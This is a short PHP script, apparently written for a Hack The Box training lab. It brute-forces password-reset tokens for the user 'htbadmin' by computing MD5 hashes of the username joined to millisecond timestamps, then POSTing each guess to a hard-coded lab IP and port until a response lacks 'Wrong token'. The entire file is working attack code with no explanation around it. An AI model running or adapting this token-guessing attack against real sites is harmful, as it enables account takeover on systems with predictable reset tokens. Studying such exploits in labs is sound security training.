<?php
function generate_reset_token($username, $offset) {
    $time = intval(microtime(true) * 1000) + $offset;
    return md5($username . $time);
}

// Define base URL
$baseUrl = 'http://94.237.62.195:48942/question1/';

// Initialize cURL session
$ch = curl_init();

// POST data
$postData = ['submit' => 'check'];

// Check a range of timestamps
$username = 'htbadmin';
for ($offset = -1000; $offset <= 1000; $offset += 1000) {
    echo $offset;
    $token = generate_reset_token($username, $offset);
    $postData['token'] = $token;

    // Set cURL options for the POST request
    curl_setopt($ch, CURLOPT_URL, $baseUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute the POST request and store the response
    $response = curl_exec($ch);

    // Check for cURL errors
    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
    }

    // Check if "Wrong token" is not in the response
    if (strpos($response, 'Wrong token') === false) {
        echo $response;
    }
}

// Close cURL session
curl_close($ch);
?>

